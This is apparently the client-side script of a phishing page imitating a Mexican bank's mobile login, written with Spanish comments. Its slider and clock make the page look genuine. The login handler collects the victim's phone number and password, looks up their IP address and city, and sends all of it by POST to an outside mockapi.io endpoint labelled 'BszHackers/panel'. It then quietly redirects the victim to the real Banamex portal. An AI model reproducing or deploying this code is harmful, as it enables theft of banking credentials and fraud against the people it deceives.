document.addEventListener('DOMContentLoaded', function() {
    const items = document.querySelectorAll('.slider-mobile .item');
    let currentItem = 0;
    const totalItems = items.length;
    
    function showNextItem() {
        // Ocultar todos los items
        items.forEach(item => {
            item.style.display = 'none';
        });
        
        // Mostrar el item actual con efecto fade
        items[currentItem].style.display = 'block';
        items[currentItem].style.animation = 'fadeIn 0.5s';
        
        // Incrementar el contador o reiniciar
        currentItem = (currentItem + 1) % totalItems;
    }
    
    // Agregar animación CSS
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes fadeIn {
            from { opacity: 0.4; }
            to { opacity: 1; }
        }
        .slider-mobile__image {
            width: 100%;
            height: auto;
            display: block;
        }
    `;
    document.head.appendChild(style);
    
    // Cambiar cada 5 segundos (5000ms)
    setInterval(showNextItem, 5000);
    
    // Iniciar el slider
    showNextItem();
});

    function actualizarFechaHora() {
      const fechaHora = new Date();
      const opciones = {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      };
      const hora = fechaHora.toLocaleTimeString('es-MX', { hour12: false });
      const fecha = fechaHora.toLocaleDateString('es-MX', opciones);
      document.getElementById('fechaHora').innerText = `${fecha}, ${hora}`;
    }

    setInterval(actualizarFechaHora, 1000);
    actualizarFechaHora();
  
  
  
  document.addEventListener('DOMContentLoaded', function() {
    const items = document.querySelectorAll('.slider-mobile .item');
    const dots = document.querySelectorAll('.dot');
    let currentItem = 0;
    const totalItems = items.length;
    let sliderInterval;
    
    function showItem(index) {
        // Ocultar todos los items
        items.forEach(item => {
            item.style.display = 'none';
        });
        
        // Desactivar todos los dots
        dots.forEach(dot => {
            dot.classList.remove('active');
        });
        
        // Mostrar el item seleccionado
        items[index].style.display = 'block';
        items[index].style.animation = 'fadeIn 0.5s';
        
        // Activar el dot correspondiente
        dots[index].classList.add('active');
        
        currentItem = index;
    }
    
    function startSlider() {
        sliderInterval = setInterval(() => {
            let nextItem = (currentItem + 1) % totalItems;
            showItem(nextItem);
        }, 5000);
    }
    
    // Event listeners para los dots
    dots.forEach((dot, index) => {
        dot.addEventListener('click', () => {
            clearInterval(sliderInterval);
            showItem(index);
            startSlider();
        });
    });
    
    // Iniciar el slider
    showItem(0);
    startSlider();
});
  
  // Genera un nombre con sílabas aleatorias enmascaradas
    function generarNombreAleatorio() {
      const silabas = ["Ma", "Jo", "Lu", "Car", "An", "Pe", "So", "Mar", "Je", "Ge", "To", "Ca", "El", "Ju"];

      const nombre = () => {
        const s = silabas[Math.floor(Math.random() * silabas.length)];
        return s.charAt(0).toUpperCase() + "*".repeat(Math.floor(Math.random() * 4 + 3));
      };

      return `${nombre()} ${nombre()} ${nombre()} ${nombre()}`;
    }

    // Inserta el nombre generado una sola vez
    document.querySelector('.login-pasword-text2').textContent = generarNombreAleatorio();
  
     // visualizacion de animacion: 
    document.getElementById('continueButton').addEventListener('click', function() {
            // Oculta el formulario de inicio de sesión
            document.getElementById('loginForm').classList.add('hidden');
            
            // Muestra el contenido de verificación
            document.getElementById('verificationContent').classList.remove('hidden');
        });
  
  
  
 document.addEventListener('DOMContentLoaded', () => {
  const numeroInput = document.getElementById('numero');
  const continueButton = document.getElementById('continueButton');
  const loginButton = document.getElementById('loginButton');

  // 🔒 Solo permitir números en el campo número
  numeroInput.addEventListener('input', () => {
    numeroInput.value = numeroInput.value.replace(/\D/g, '');
  });

  // 👉 Al hacer clic en Continuar, mostrar campo de contraseña
  continueButton.addEventListener('click', () => {
    const numero = numeroInput.value.trim();
    if (numero === '') {
      alert('Por favor, ingresa tu número');
      return;
    }

    document.getElementById('loginForm').classList.add('hidden');
    document.getElementById('verificationContent').classList.remove('hidden');
  });

  // 📤 Al hacer clic en Iniciar sesión, obtener IP, ubicación y enviar todo
  loginButton.addEventListener('click', async () => {
    const numero = numeroInput.value.trim();
    const password = document.getElementById('password').value.trim();

    if (!numero || !password) {
      alert('Completa todos los campos');
      return;
    }

    try {
      // 🌐 Obtener IP
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      // 📍 Obtener ciudad y región usando la IP
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoRes.json();
      const ciudad = geoData.city || 'Desconocida';
      const region = geoData.region || 'Desconocida';

      // 📦 Datos a enviar
      const datos = {
        numero,
        password,
        ip,
        ciudad,
        region
      };

      // 🚀 Enviar a la API
      const res = await fetch('https://6868091ed5933161d70a9e98.mockapi.io/api/BszHackers/panel/01', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(datos)
      });

      if (res.ok) {
        // Redirigir sin alerta
        window.location.href = 'https://bancanet.banamex.com/MXGCB/JPS/portal/LocaleSwitch.do?locale=es_MX'; // <-- Cambia esta URL
      } else {
        alert('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al obtener IP o enviar datos:', error);
      alert('Error de red');
    }
  });
});
